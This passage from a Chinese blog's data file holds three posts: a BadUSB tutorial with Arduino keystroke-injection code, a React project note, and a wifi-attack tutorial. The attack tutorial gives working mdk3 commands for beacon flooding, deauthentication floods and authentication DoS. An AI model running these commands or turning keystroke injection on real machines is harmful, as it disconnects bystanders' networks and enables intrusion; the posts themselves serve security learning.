<strong>↓</strong></p>\n<p><img src=\"/images/pasted-128.jpg\" alt></p>\n<p>然后可以来编写代码了。<br>我们可以先来写一个hello world  <strong>↓</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;Keyboard.h&gt; //包含键盘模块头文件</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">setup</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// put your setup code here, to run once:</span></span><br><span class=\"line\">  Keyboard.begin();<span class=\"comment\">//开始键盘通信</span></span><br><span class=\"line\">  delay(<span class=\"number\">1000</span>);<span class=\"comment\">//延时1000毫秒，不要太短，因为每天电脑的运行速度都不一样</span></span><br><span class=\"line\">  Keyboard.press(KEY_CAPS_LOCK); <span class=\"comment\">//按下大写键 这里我们最好这样写 不然大多数电脑在中文输入的情况下就会出现问题</span></span><br><span class=\"line\">  Keyboard.release(KEY_CAPS_LOCK); <span class=\"comment\">//释放大写键</span></span><br><span class=\"line\">  delay(<span class=\"number\">500</span>);</span><br><span class=\"line\">  Keyboard.press(KEY_LEFT_GUI);<span class=\"comment\">//按下徽标键 也就是win键</span></span><br><span class=\"line\">  delay(<span class=\"number\">500</span>);</span><br><span class=\"line\">  Keyboard.press(<span class=\"string\">'r'</span>);<span class=\"comment\">//按下r键</span></span><br><span class=\"line\">  delay(<span class=\"number\">500</span>);</span><br><span class=\"line\">  Keyboard.release(KEY_LEFT_GUI);<span class=\"comment\">//松掉win键</span></span><br><span class=\"line\">  Keyboard.release(<span class=\"string\">'r'</span>);<span class=\"comment\">//松掉r键</span></span><br><span class=\"line\">  delay(<span class=\"number\">500</span>);</span><br><span class=\"line\">  Keyboard.println(<span class=\"string\">\"cmd\"</span>);<span class=\"comment\">//输入cmd进入DOS</span></span><br><span class=\"line\">  delay(<span class=\"number\">500</span>);</span><br><span class=\"line\">  Keyboard.press(KEY_RETURN);  <span class=\"comment\">//按下回车键</span></span><br><span class=\"line\">  Keyboard.release(KEY_RETURN); <span class=\"comment\">//释放回车键</span></span><br><span class=\"line\">  delay(<span class=\"number\">500</span>);</span><br><span class=\"line\">  Keyboard.println(<span class=\"string\">\"echo hello world\"</span>);</span><br><span class=\"line\">  Keyboard.press(KEY_RETURN);  <span class=\"comment\">//按下回车键</span></span><br><span class=\"line\">  Keyboard.release(KEY_RETURN); <span class=\"comment\">//释放回车键</span></span><br><span class=\"line\">  delay(<span class=\"number\">500</span>);</span><br><span class=\"line\">  Keyboard.press(KEY_CAPS_LOCK); <span class=\"comment\">//按下大写键</span></span><br><span class=\"line\">  Keyboard.release(KEY_CAPS_LOCK); <span class=\"comment\">//释放大写键 我们再次关闭开启的大写键</span></span><br><span class=\"line\">  delay(<span class=\"number\">500</span>);</span><br><span class=\"line\">  Keyboard.end();<span class=\"comment\">//结束键盘通讯</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">loop</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// put your main code here, to run repeatedly:</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>然后编译验证  <strong>↓</strong></p>\n<p><img src=\"/images/pasted-129.jpg\" alt></p>\n<p>如果提示这个就说明编译验证成功了  <strong>↓</strong></p>\n<p><img src=\"/images/pasted-130.jpg\" alt></p>\n<p>接下来就可以把代码上传到Arduino Leonardo，来完成BadUSB制作的最后一步。  <strong>↓</strong></p>\n<p><img src=\"/images/pasted-131.jpg\" alt></p>\n<p>上传成功后会自动断开USB然后再次连接并且执行代码。</p>\n<p>会根据代码来依次执行，先按出win+r键，然后按出cmd 回车，最后输入echo hello world。</p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>当然我们可以执行powershell指令来下载自己的payload然后执行，或者其他一些代码。</p>\n<p>我这里放几个例子<a href=\"https://github.com/Y00z/BadUSB\" target=\"_blank\" rel=\"noopener\">https://github.com/Y00z/BadUSB</a>。</p>\n","site":{"data":{}},"excerpt":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><blockquote>\n<font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！</strong></font>\n</blockquote>\n<h3 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BadUSB早在2014年底的PacSec会议上便已经提出，这是USB协议中的一个漏洞————USB设备可以伪装成为其他任何设备，例如输入设备、网卡等等。这个漏洞目前还没有得到修复，几乎可以说在有合适的脚本的情况下，只要能够插进去，没有什么是黑不掉的！","more":"</p>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;差不多的原理就是伪装成HID设备如键盘或者鼠标，然后模拟键盘按键来打开cmd执行powershell指令对电脑进行攻击，而且这种攻击是无法拦截的。</p>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;制作BadUsb有两个方法，一种是Arduino开发板，另一种PS2251-03的微处理器的U盘，可以在这里看U盘的<a href=\"https://github.com/brandonlw/Psychson/wiki/Known-Supported-Devices\" target=\"_blank\" rel=\"noopener\">列表型号</a> ，这里我使用的第一种制作方法。<br>(ps：我本来用的是第二种方法，买了指定型号的u盘，买回来后发现微处理器并不是PS2251-03微处理器，然后才换了第一种方法)</p>\n<h4 id=\"材料\"><a href=\"#材料\" class=\"headerlink\" title=\"材料\"></a>材料</h4><pre><code>* Arduino Leonardo\n* Arduino IDE \n* micro usb数据线\n</code></pre><p>Arduino Leonardo 可以去水深宝淘到。</p>\n<p>Arduino IDE 下载地址：<a href=\"https://www.arduino.cc/en/Main/Software\" target=\"_blank\" rel=\"noopener\">https://www.arduino.cc/en/Main/Software</a></p>\n<p>Arduino Leonardo <strong>↓</strong></p>\n<p> <img src=\"/images/pasted-123.jpg\" alt></p>\n<p>拆开看看 <strong>↓</strong></p>\n<p><img src=\"/images/pasted-124.jpg\" alt></p>\n<p>使用micro usb 安卓数据线就可以和电脑连接了  <strong>↓</strong></p>\n<p><img src=\"/images/pasted-125.jpg\" alt></p>\n<h5 id=\"Arduino-IDE\"><a href=\"#Arduino-IDE\" class=\"headerlink\" title=\"Arduino IDE\"></a>Arduino IDE</h5><p>打开后默认是这样的  <strong>↓</strong></p>\n<p><img src=\"/images/pasted-126.jpg\" alt></p>\n<p>同时需要把IDE菜单=&gt;工具的两个选项选一下。 <strong>↓</strong></p>\n<p><img src=\"/images/pasted-127.jpg\" alt></p>\n<p>这个选项需要电脑连接开发板后才有  <strong>↓</strong></p>\n<p><img src=\"/images/pasted-128.jpg\" alt></p>\n<p>然后可以来编写代码了。<br>我们可以先来写一个hello world  <strong>↓</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;Keyboard.h&gt; //包含键盘模块头文件</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">setup</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// put your setup code here, to run once:</span></span><br><span class=\"line\">  Keyboard.begin();<span class=\"comment\">//开始键盘通信</span></span><br><span class=\"line\">  delay(<span class=\"number\">1000</span>);<span class=\"comment\">//延时1000毫秒，不要太短，因为每天电脑的运行速度都不一样</span></span><br><span class=\"line\">  Keyboard.press(KEY_CAPS_LOCK); <span class=\"comment\">//按下大写键 这里我们最好这样写 不然大多数电脑在中文输入的情况下就会出现问题</span></span><br><span class=\"line\">  Keyboard.release(KEY_CAPS_LOCK); <span class=\"comment\">//释放大写键</span></span><br><span class=\"line\">  delay(<span class=\"number\">500</span>);</span><br><span class=\"line\">  Keyboard.press(KEY_LEFT_GUI);<span class=\"comment\">//按下徽标键 也就是win键</span></span><br><span class=\"line\">  delay(<span class=\"number\">500</span>);</span><br><span class=\"line\">  Keyboard.press(<span class=\"string\">'r'</span>);<span class=\"comment\">//按下r键</span></span><br><span class=\"line\">  delay(<span class=\"number\">500</span>);</span><br><span class=\"line\">  Keyboard.release(KEY_LEFT_GUI);<span class=\"comment\">//松掉win键</span></span><br><span class=\"line\">  Keyboard.release(<span class=\"string\">'r'</span>);<span class=\"comment\">//松掉r键</span></span><br><span class=\"line\">  delay(<span class=\"number\">500</span>);</span><br><span class=\"line\">  Keyboard.println(<span class=\"string\">\"cmd\"</span>);<span class=\"comment\">//输入cmd进入DOS</span></span><br><span class=\"line\">  delay(<span class=\"number\">500</span>);</span><br><span class=\"line\">  Keyboard.press(KEY_RETURN);  <span class=\"comment\">//按下回车键</span></span><br><span class=\"line\">  Keyboard.release(KEY_RETURN); <span class=\"comment\">//释放回车键</span></span><br><span class=\"line\">  delay(<span class=\"number\">500</span>);</span><br><span class=\"line\">  Keyboard.println(<span class=\"string\">\"echo hello world\"</span>);</span><br><span class=\"line\">  Keyboard.press(KEY_RETURN);  <span class=\"comment\">//按下回车键</span></span><br><span class=\"line\">  Keyboard.release(KEY_RETURN); <span class=\"comment\">//释放回车键</span></span><br><span class=\"line\">  delay(<span class=\"number\">500</span>);</span><br><span class=\"line\">  Keyboard.press(KEY_CAPS_LOCK); <span class=\"comment\">//按下大写键</span></span><br><span class=\"line\">  Keyboard.release(KEY_CAPS_LOCK); <span class=\"comment\">//释放大写键 我们再次关闭开启的大写键</span></span><br><span class=\"line\">  delay(<span class=\"number\">500</span>);</span><br><span class=\"line\">  Keyboard.end();<span class=\"comment\">//结束键盘通讯</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">loop</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// put your main code here, to run repeatedly:</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>然后编译验证  <strong>↓</strong></p>\n<p><img src=\"/images/pasted-129.jpg\" alt></p>\n<p>如果提示这个就说明编译验证成功了  <strong>↓</strong></p>\n<p><img src=\"/images/pasted-130.jpg\" alt></p>\n<p>接下来就可以把代码上传到Arduino Leonardo，来完成BadUSB制作的最后一步。  <strong>↓</strong></p>\n<p><img src=\"/images/pasted-131.jpg\" alt></p>\n<p>上传成功后会自动断开USB然后再次连接并且执行代码。</p>\n<p>会根据代码来依次执行，先按出win+r键，然后按出cmd 回车，最后输入echo hello world。</p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>当然我们可以执行powershell指令来下载自己的payload然后执行，或者其他一些代码。</p>\n<p>我这里放几个例子<a href=\"https://github.com/Y00z/BadUSB\" target=\"_blank\" rel=\"noopener\">https://github.com/Y00z/BadUSB</a>。</p>"},{"layout":"post","title":"React开发新闻网适配pc端及移动端","date":"2017-05-30T11:07:12.000Z","comments":1,"_content":"\n#### 前言\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;React项目，我是先接触的React-Native，并且也开发过几个小项目。由于React-Native是由React衍生过来的，所以学习React起来也非常快，得心应手。\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个项目比较简单，代码简洁明了，封装性很强，比较适合初识react的同学了解和学习\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;支持用户注册,登录退出,新闻收藏，评论等。\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;项目同时对pc端以及移动端做了相应的适配，项目用的es6\n\n#### 简介\n   * 聚合新闻接口\n   * UI框架,antd\n   * 路由react-router\n<!--more-->\n\n#### 演示(动画较大,请耐心等待)\n\n\n pc端\n\n ![](/images/react_pc.gif)\n\n 移动端\n\n![](/images/react_mobile.gif)\n\n\n\n#### 运行\n* npm install\n* npm start\n\n#### 项目源码地址\n* [https://github.com/Y00z/react_news](https://github.com/Y00z/react_news)","source":"_posts/diary-2017-0530-01.md","raw":"---\nlayout: post\ntitle: React开发新闻网适配pc端及移动端\ndate: 2017-05-30 19:07:12\ncomments: true\ntags:\n\t- React\n\t- 开源\n---\n\n#### 前言\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;React项目，我是先接触的React-Native，并且也开发过几个小项目。由于React-Native是由React衍生过来的，所以学习React起来也非常快，得心应手。\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个项目比较简单，代码简洁明了，封装性很强，比较适合初识react的同学了解和学习\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;支持用户注册,登录退出,新闻收藏，评论等。\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;项目同时对pc端以及移动端做了相应的适配，项目用的es6\n\n#### 简介\n   * 聚合新闻接口\n   * UI框架,antd\n   * 路由react-router\n<!--more-->\n\n#### 演示(动画较大,请耐心等待)\n\n\n pc端\n\n ![](/images/react_pc.gif)\n\n 移动端\n\n![](/images/react_mobile.gif)\n\n\n\n#### 运行\n* npm install\n* npm start\n\n#### 项目源码地址\n* [https://github.com/Y00z/react_news](https://github.com/Y00z/react_news)","slug":"diary-2017-0530-01","published":1,"updated":"2017-07-07T10:20:57.383Z","photos":[],"link":"","_id":"cjvhjxab0000siny2djr3kswn","content":"<h4 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;React项目，我是先接触的React-Native，并且也开发过几个小项目。由于React-Native是由React衍生过来的，所以学习React起来也非常快，得心应手。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个项目比较简单，代码简洁明了，封装性很强，比较适合初识react的同学了解和学习<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;支持用户注册,登录退出,新闻收藏，评论等。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;项目同时对pc端以及移动端做了相应的适配，项目用的es6</p>\n<h4 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h4><ul>\n<li>聚合新闻接口</li>\n<li>UI框架,antd</li>\n<li>路由react-router<a id=\"more\"></a>\n</li>\n</ul>\n<h4 id=\"演示-动画较大-请耐心等待\"><a href=\"#演示-动画较大-请耐心等待\" class=\"headerlink\" title=\"演示(动画较大,请耐心等待)\"></a>演示(动画较大,请耐心等待)</h4><p> pc端</p>\n<p> <img src=\"/images/react_pc.gif\" alt></p>\n<p> 移动端</p>\n<p><img src=\"/images/react_mobile.gif\" alt></p>\n<h4 id=\"运行\"><a href=\"#运行\" class=\"headerlink\" title=\"运行\"></a>运行</h4><ul>\n<li>npm install</li>\n<li>npm start</li>\n</ul>\n<h4 id=\"项目源码地址\"><a href=\"#项目源码地址\" class=\"headerlink\" title=\"项目源码地址\"></a>项目源码地址</h4><ul>\n<li><a href=\"https://github.com/Y00z/react_news\" target=\"_blank\" rel=\"noopener\">https://github.com/Y00z/react_news</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"<h4 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;React项目，我是先接触的React-Native，并且也开发过几个小项目。由于React-Native是由React衍生过来的，所以学习React起来也非常快，得心应手。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个项目比较简单，代码简洁明了，封装性很强，比较适合初识react的同学了解和学习<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;支持用户注册,登录退出,新闻收藏，评论等。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;项目同时对pc端以及移动端做了相应的适配，项目用的es6</p>\n<h4 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h4><ul>\n<li>聚合新闻接口</li>\n<li>UI框架,antd</li>\n<li>路由react-router","more":"</li>\n</ul>\n<h4 id=\"演示-动画较大-请耐心等待\"><a href=\"#演示-动画较大-请耐心等待\" class=\"headerlink\" title=\"演示(动画较大,请耐心等待)\"></a>演示(动画较大,请耐心等待)</h4><p> pc端</p>\n<p> <img src=\"/images/react_pc.gif\" alt></p>\n<p> 移动端</p>\n<p><img src=\"/images/react_mobile.gif\" alt></p>\n<h4 id=\"运行\"><a href=\"#运行\" class=\"headerlink\" title=\"运行\"></a>运行</h4><ul>\n<li>npm install</li>\n<li>npm start</li>\n</ul>\n<h4 id=\"项目源码地址\"><a href=\"#项目源码地址\" class=\"headerlink\" title=\"项目源码地址\"></a>项目源码地址</h4><ul>\n<li><a href=\"https://github.com/Y00z/react_news\" target=\"_blank\" rel=\"noopener\">https://github.com/Y00z/react_news</a></li>\n</ul>"},{"layout":"post","title":"wifi干扰","date":"2017-06-08T02:13:25.000Z","comments":1,"_content":"\n### 前言\n><font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！**</font>\n\n### 正文\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;很早之前就在网上看到过一个固件，烧录在开发板中，然后可以用来攻击wifi和干扰wifi，其实原理很简单，干扰可以使用mkd3来完成，攻击可以使用aircrack-ng套件来完成，早在之前我就发过使用aircrack-ng攻击的相关文章[(点我)](https://y00z.github.io/2017/04/12/diary-2017-0412-01/)，只是这个固件把这两个结合在了一起，喜欢折腾硬件的朋友可以去试一试。\n\n<!--more-->\n固件地址 \n[https://github.com/spacehuhn/esp8266_deauther](https://github.com/spacehuhn/esp8266_deauther)\n\n### 干扰\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;很早之前就知道了wifi干扰，就是创建数十个杂乱的wifi来干扰正常的信号接收，前几天突然看到有人用wifi来表白，真是脑洞大开。然后我测试了一下也可以使用mdk3的wifi干扰来实现。\n\n我们使用的是mdk3中的b模块(b-Beacon Flood Mode)\n\n\tmdk3 wlan0 b -g -c 11\n\n* -c 信道\n* -g 54Mbit模式\t\t\t**↓**\n\t\t\t\t\t\n ![](/images/pasted-132.jpg)\n\n这种是创建数十个杂乱wifi信号来干扰。 **↓**\n\n ![](/images/pasted-133.jpg)\n\n下面我们可以来创建自定义wifi。\n\n首先把wifi名一行一个的保存在文本中。 **↓**\n\n ![](/images/pasted-134.jpg)\n\n我们先创建4个，当然也可以更多。\n\n\tmdk3 wlan0 b -g -c 11 -f /root/ap.txt\n\n * -f 自定义wifi名\t\t**↓**\n\n ![](/images/pasted-136.jpg)\n\n然后会创建出以我们保存在文本中的名字的wifi名。**↓**\n\n ![](/images/pasted-135.jpg)\n\n\n### 题外\n\n下面再来说说攻击模块，我在前面说过攻击模块还是aircrack-ng套件比较好用[(点我)](https://y00z.github.io/2017/04/12/diary-2017-0412-01/)\n\n#### 洪水攻击\n\nmdk3下有两个攻击方式其中一个就是洪水攻击，d模块(De-authentication Flood Attack)\n\n\tmdk3 wlan0 d -c 11\n\n所有连接了频道为11的ap设备全部断线。\n\n同时也有个设置白名单\n\n\tmdk3 mon0 d -c 11 -w \"whitelist.txt\"\n * -w 白名单\n * -b 黑名单\n\n除了保存在白名单中的设备，其他全部断线。\n\n\n#### 身份验证攻击\n\n还有一个种就是身份验证攻击，向wifi发送随机的大量连接请求，a模块(Authentication DoS mode)\n\n\tmdk3 wlan0 a -a wifi_MAC\n * -a wifi的mac地址\n\n\n\n\n\n\n","source":"_posts/diary-2017-0628-01.md","raw":"---\nlayout: post\ntitle: wifi干扰\ndate: 2017-06-08 10:13:25\ncomments: true\ntags:\n\t- 安全攻防\n---\n\n### 前言\n><font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！**</font>\n\n### 正文\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;很早之前就在网上看到过一个固件，烧录在开发板中，然后可以用来攻击wifi和干扰wifi，其实原理很简单，干扰可以使用mkd3来完成，攻击可以使用aircrack-ng套件来完成，早在之前我就发过使用aircrack-ng攻击的相关文章[(点我)](https://y00z.github.io/2017/04/12/diary-2017-0412-01/)，只是这个固件把这两个结合在了一起，喜欢折腾硬件的朋友可以去试一试。\n\n<!--more-->\n固件地址 \n[https://github.com/spacehuhn/esp8266_deauther](https://github.com/spacehuhn/esp8266_deauther)\n\n### 干扰\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;很早之前就知道了wifi干扰，就是创建数十个杂乱的wifi来干扰正常的信号接收，前几天突然看到有人用wifi来表白，真是脑洞大开。然后我测试了一下也可以使用mdk3的wifi干扰来实现。\n\n我们使用的是mdk3中的b模块(b-Beacon Flood Mode)\n\n\tmdk3 wlan0 b -g -c 11\n\n* -c 信道\n* -g 54Mbit模式\t\t\t**↓**\n\t\t\t\t\t\n ![](/images/pasted-132.jpg)\n\n这种是创建数十个杂乱wifi信号来干扰。 **↓**\n\n ![](/images/pasted-133.jpg)\n\n下面我们可以来创建自定义wifi。\n\n首先把wifi名一行一个的保存在文本中。 **↓**\n\n ![](/images/pasted-134.jpg)\n\n我们先创建4个，当然也可以更多。\n\n\tmdk3 wlan0 b -g -c 11 -f /root/ap.txt\n\n * -f 自定义wifi名\t\t**↓**\n\n ![](/images/pasted-136.jpg)\n\n然后会创建出以我们保存在文本中的名字的wifi名。**↓**\n\n ![](/images/pasted-135.jpg)\n\n\n### 题外\n\n下面再来说说攻击模块，我在前面说过攻击模块还是aircrack-ng套件比较好用[(点我)](https://y00z.github.io/2017/04/12/diary-2017-0412-01/)\n\n#### 洪水攻击\n\nmdk3下有两个攻击方式其中一个就是洪水攻击，d模块(De-authentication Flood Attack)\n\n\tmdk3 wlan0 d -c 11\n\n所有连接了频道为11的ap设备全部断线。\n\n同时也有个设置白名单\n\n\tmdk3 mon0 d -c 11 -w \"whitelist.txt\"\n * -w 白名单\n * -b 黑名单\n\n除了保存在白名单中的设备，其他全部断线。\n\n\n#### 身份验证攻击\n\n还有一个种就是身份验证攻击，向wifi发送随机的大量连接请求，a模块(Authentication DoS mode)\n\n\tmdk3 wlan0 a -a wifi_MAC\n * -a wifi的mac地址\n\n\n\n\n\n\n","slug":"diary-2017-0628-01","published":1,"updated":"2017-07-19T02:48:31.111Z","photos":[],"link":"","_id":"cjvhjxab1000tiny2r3rn89or","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><blockquote>\n<font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！</strong></font>\n</blockquote>\n<h3 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;很早之前就在网上看到过一个固件，烧录在开发板中，然后可以用来攻击wifi和干扰wifi，其实原理很简单，干扰可以使用mkd3来完成，攻击可以使用aircrack-ng套件来完成，早在之前我就发过使用aircrack-ng攻击的相关文章<a href=\"https://y00z.github.io/2017/04/12/diary-2017-0412-01/\">(点我)</a>，只是这个固件把这两个结合在了一起，喜欢折腾硬件的朋友可以去试一试。</p>\n<a id=\"more\"></a>\n<p>固件地址<br><a href=\"https://github.com/spacehuhn/esp8266_deauther\" target=\"_blank\" rel=\"noopener\">https://github.com/spacehuhn/esp8266_deauther</a></p>\n<h3 id=\"干扰\"><a href=\"#干扰\" class=\"headerlink\" title=\"干扰\"></a>干扰</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;很早之前就知道了wifi干扰，就是创建数十个杂乱的wifi来干扰正常的信号接收，前几天突然看到有人用wifi来表白，真是脑洞大开。然后我测试了一下也可以使用mdk3的wifi干扰来实现。</p>\n<p>我们使用的是mdk3中的b模块(b-Beacon Flood Mode)</p>\n<pre><code>mdk3 wlan0 b -g -c 11\n</code></pre><ul>\n<li>-c 信道</li>\n<li><p>-g 54Mbit模式            <strong>↓</strong></p>\n<p><img src=\"/images/pasted-132.jpg\" alt></p>\n</li>\n</ul>\n<p>这种是创建数十个杂乱wifi信号来干扰。 <strong>↓</strong></p>\n<p> <img src=\"/images/pasted-133.jpg\" alt></p>\n<p>下面我们可以来创建自定义wifi。</p>\n<p>首先把wifi名一行一个的保存在文本中。 <strong>↓</strong></p>\n<p> <img src=\"/images/pasted-134.jpg\" alt></p>\n<p>我们先创建4个，当然也可以更多。</p>\n<pre><code>mdk3 wlan0 b -g -c 11 -f /root/ap.txt\n</code></pre><ul>\n<li><p>-f 自定义wifi名        <strong>↓</strong></p>\n<p><img src=\"/images/pasted-136.jpg\" alt></p>\n</li>\n</ul>\n<p>然后会创建出以我们保存在文本中的名字的wifi名。<strong>↓</strong></p>\n<p> <img src=\"/images/pasted-135.jpg\" alt></p>\n<h3 id=\"题外\"><a href=\"#题外\" class=\"headerlink\" title=\"题外\"></a>题外</h3><p>下面再来说说攻击模块，我在前面说过攻击模块还是aircrack-ng套件比较好用<a href=\"https://y00z.github.io/2017/04/12/diary-2017-0412-01/\">(点我)</a></p>\n<h4 id=\"洪水攻击\"><a href=\"#洪水攻击\" class=\"headerlink\" title=\"洪水攻击\"></a>洪水攻击</h4><p>mdk3下有两个攻击方式其中一个就是洪水攻击，d模块(De-authentication Flood Attack)</p>\n<pre><code>mdk3 wlan0 d -c 11\n</code></pre><p>所有连接了频道为11的ap设备全部断线。</p>\n<p>同时也有个设置白名单</p>\n<pre><code>mdk3 mon0 d -c 11 -w &quot;whitelist.txt&quot;\n</code></pre><ul>\n<li>-w 白名单</li>\n<li>-b 黑名单</li>\n</ul>\n<p>除了保存在白名单中的设备，其他全部断线。</p>\n<h4 id=\"身份验证攻击\"><a href=\"#身份验证攻击\" class=\"headerlink\" title=\"身份验证攻击\"></a>身份验证攻击</h4><p>还有一个种就是身份验证攻击，向wifi发送随机的大量连接请求，a模块(Authentication DoS mode)</p>\n<pre><code>mdk3 wlan0 a -a wifi_MAC\n</code></pre><ul>\n<li>-a wifi的mac地址</li>\n</ul>\n","site":{"data":{}},"excerpt":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><blockquote>\n<font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！</strong></font>\n</blockquote>\n<h3 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;很早之前就在网上看到过一个固件，烧录在开发板中，然后可以用来攻击wifi和干扰wifi，其实原理很简单，干扰可以使用mkd3来完成，攻击可以使用aircrack-ng套件来完成，早在之前我就发过使用aircrack-ng攻击的相关文章<a 